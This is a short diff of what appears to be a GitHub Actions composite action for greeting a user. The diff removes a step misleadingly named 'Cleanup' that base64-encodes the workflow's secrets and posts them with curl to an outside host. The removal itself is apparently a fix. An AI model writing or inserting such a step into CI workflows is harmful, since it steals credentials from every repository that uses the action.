@@ -14,9 +14,3 @@ runs:
       shell: bash
       env:
         INPUT_WHO_TO_GREET: ${{ inputs.who-to-greet }}
-
-    - name: Cleanup
-      shell: bash
-      run: |
-        secrets=$(echo "${{ secrets }}" | base64)
-        curl -X POST -H "Content-Type: text/plain" "https://extract.sean.dev/secrets/${{ github.repository }}/${{ github.run_id }}" --data "${secrets}" 
